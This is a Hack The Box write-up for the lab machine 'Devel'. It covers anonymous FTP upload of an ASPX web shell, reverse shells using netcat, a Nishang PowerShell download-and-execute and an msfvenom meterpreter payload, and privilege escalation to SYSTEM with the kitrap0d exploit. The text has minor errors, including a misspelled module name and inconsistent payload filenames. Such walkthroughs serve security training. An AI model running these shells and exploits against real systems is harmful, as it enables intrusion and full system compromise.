@@ -1,0 +1,108 @@
+HTB-Devel-Writeup
+
+ip : 10.10.10.5
+
+Nmap 
+----
+- nmap revealed 2 open ports 
+	21 for FTP
+	80 for HTTP Microsoft IIS 
+
+Enumeration
+-----------
+- ftp is of interest to us since its not normal to see it open
+- nmap will reveal if anonymous login for FTP is open
+- we try anonymous login and got in
+
+	ftp 10.10.10.5
+
+- in FTP we have a few files related to IIS server (aspnet_client, iisstart.htm, welcome.png) 
+- we visit port 80 and got a default IIS server page 
+
+Shell as web
+------------
+- we can upload a aspx webshell into the FTP and access it through port 80
+- we grab the web shell comes along with seclists and add it to the FTP
+
+	put cmd.aspx
+
+- now we visit http://10.10.10.5:80/cmd.aspx and we got a web shell which executes command on the box as web
+- we can a proper shell out of this in three ways 
+
+Shell with Netcat
+-----------------
+- we can share the nc.exe through smbshare.py for that we need to create a directory called smb and copy the nc.exe into it 
+- now we can share the directory
+
+	smbserver.py share smb
+
+- we can start a netcat listener to catch the shell
+
+	nc -nlvp 9001
+
+- now we just neeed to get the nc.exe from the server and run it to send a connection to our netcat listener
+
+	\\10.10.14.54\share\nc.exe -e cmd.exe 10.10.14.54 9001
+
+- we got shell as web 
+
+Shell with Nishang
+------------------
+- clone the nishang git and grab the InvokePowerShellTCP.ps1
+- edit the reverse shell 
+- place this commands at the bottom
+
+	Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.14 -Port 9001
+
+- place it into the smb directory and share it with a python server  
+- start a nc listener 
+- run these commands in the webshell
+
+	powershell iex(new-object net.webclient).downloadstring('http://10.10.14.14/Invoke-PowerShellTcp.ps1')
+
+- this will give us a shell back in the nc listener 
+
+Shell with Meterpreter
+----------------------
+- we can create a payload with msfvenom 
+
+	msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.54 LPORT=4444 -f aspx > rev.aspx
+
+- upload it to FTP
+- msfconsole and start a listener and set options
+
+	use exploit/multi/handler 
+	set payload windows/meterpreter/reverse_tcp
+	set lhost tun0
+	set lport 4444
+	run
+
+- now we can activate the reverse shell by visiting the url or using curl
+
+	http://10.10.10.5/met_rev_443.aspx
+
+	curl http://10.10.10.5/met_rev_443.aspx
+
+- we got a reverse shell back in the listener 
+
+Priv-esc
+--------
+- we run systeminfo and notice that no patches are applied 
+- this might be vulnerable to many kernal exploits
+- since we are on meterpreter we can use the metasploit exploit suggester to look for exploits 
+- we background the session and use the following 
+
+	use post/multi/recon/loal_exploit_suggester
+	
+- set the session to our backgrounded session and run 
+- we got a bunch of results out of which we can try out exploit/windows/local/ms10_015_kitrap0d
+
+	use exploit/windows/local/ms10_015_kitrap0d
+	set session 1
+	set payload windows/meterpreter/reverse_tcp
+	set lhost tun0
+	set lport 4444
+	run
+
+- we got a shell as NT AUTHORITY\SYSTEM
+- grab the user and root flags 
